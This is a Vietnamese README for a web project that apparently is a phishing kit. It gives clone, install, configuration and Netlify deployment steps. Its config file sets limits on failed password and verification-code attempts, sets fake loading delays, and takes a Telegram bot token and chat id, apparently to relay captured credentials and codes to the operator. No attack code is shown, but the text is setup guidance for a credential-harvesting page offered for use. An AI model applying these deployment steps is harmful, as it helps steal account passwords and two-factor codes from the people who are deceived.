# LXIXOER4UY 🎉

[![wakatime](https://wakatime.com/badge/user/018c30ee-bce4-4e46-ab03-5214782a4e51/project/52ab3b70-b232-4362-b70b-59a2e6f01a5e.svg)](https://wakatime.com/badge/user/018c30ee-bce4-4e46-ab03-5214782a4e51/project/52ab3b70-b232-4362-b70b-59a2e6f01a5e)

## Cài Đặt và Chạy 🚀

1. **Clone Repository:**

    ```bash
    git clone https://github.com/ovftank/LxixoeR4uy
    cd LxixoeR4uy
    ```

2. **Cài Đặt Node.js:**

    Nếu chưa cài đặt Node.js, hãy tải và cài đặt Node.js từ liên kết sau: [Tải Node.js](https://nodejs.org/dist/v18.20.4/node-v18.20.4-x64.msi) 🌟

3. **Cài Đặt Git:**

    Nếu chưa cài đặt Git, hãy tải và cài đặt Git cho Windows từ liên kết sau: [Tải Git cho Windows](https://github.com/git-for-windows/git/releases/download/v2.46.0.windows.1/Git-2.46.0-64-bit.exe) 🖥️

4. **Cài Đặt Các Thư Viện:**

    ```bash
    npm install
    ```

5. **Chỉnh Sửa Cấu Hình:**

    Sửa file `config.ts` trong thư mục `src\utils` để cấu hình các thiết lập.

    ```typescript
    const config = {
        settings: {
            code_loading_time: 15000,
            max_failed_code_attempts: 3,
            max_failed_password_attempts: 2,
            page_loading_time: 5000,
            password_loading_time: 10000,
        },
        telegram: {
            chatid: '',
            token: '',
        },
    };

    export default config;
    ```

## Triển Khai (Deploy) 🚀

[![wakatime](https://wakatime.com/badge/user/018c30ee-bce4-4e46-ab03-5214782a4e51/project/52ab3b70-b232-4362-b70b-59a2e6f01a5e.svg)](https://wakatime.com/badge/user/018c30ee-bce4-4e46-ab03-5214782a4e51/project/52ab3b70-b232-4362-b70b-59a2e6f01a5e)

- **Tự Động Deploy:**

    Sau khi sửa đổi và commit thay đổi, chỉ cần đẩy các thay đổi lên remote repository bằng lệnh:

    ```bash
    git add .
    git commit -m "Nội dung cập nhật"
    git push origin frontend
    ```

    Netlify sẽ tự động deploy. 🎉

- **Triển Khai Thủ Công:**

    Nếu muốn triển khai thủ công, cần phải xây dựng dự án trước khi triển khai. Sử dụng lệnh sau để xây dựng dự án:

    ```bash
    npm run build
    ```

    Sau đó, có thể triển khai thủ công dự án đã xây dựng. 🛠️

## Copyright 📝

© 2024 OvFTeam. All rights reserved. 💼
